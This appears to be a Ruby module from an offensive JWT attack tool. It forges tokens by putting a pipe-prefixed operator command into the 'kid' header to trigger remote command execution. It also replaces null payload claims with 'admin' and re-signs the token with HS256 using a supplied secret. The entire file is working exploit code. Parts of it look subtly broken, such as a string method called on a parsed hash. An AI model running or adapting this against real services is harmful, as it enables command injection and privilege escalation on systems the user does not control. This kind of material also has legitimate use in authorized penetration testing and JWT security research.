module JWTrce
    def remotecode
        if ARGS[:jwtoken]
            def headertyperce(token)
                newheader = JSON.parse(token.header)
                puts newheader
                if newheader["typ"] == "JWT" and newheader["kid"] and newheader["alg"] == "HS256"
                    puts "***\t Header could include RCE! \t***"
                    puts "Do you want to get new token with RCE? Yes[y/Y] - No[n/N]"
                    condition = General.yesorno
                    if condition
                        print "Type code to remote execute: "
                        val = STDIN.gets.chomp
                        val = "|"+val
                        #puts "Do you have \"Secret\" or \"Secret-List\"? Single[s/S] - List[l/L] "
                        print "Tpye secret: "
                        secret = STDIN.gets.chomp
                        payload = token.payload.to_json
                        payload = JSON.parse(payload)
                        payload = payload.gsub("null",'"admin"')
                        newheader["kid"] = val
                        newtoken = Base64.strict_encode64(newheader.to_json).gsub(/=+$/,"")+"."
                        newtoken+= Base64.strict_encode64(payload).gsub(/=+$/,"")
                        signed_token = newtoken+"."+Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, newtoken))
                        puts "New created token: #{signed_token}"
                    end
                end
            end
            info = General.try_seperate(ARGS[:jwtoken])
            General.showtoken(ARGS[:jwtoken])
            jwtoken = Token.new(info[0], info[1], info[2], info[3])
            val = General.jwkcheck(jwtoken.header)
            #puts val
            headertyperce(jwtoken)
            #puts info
            exit
        end
    end
end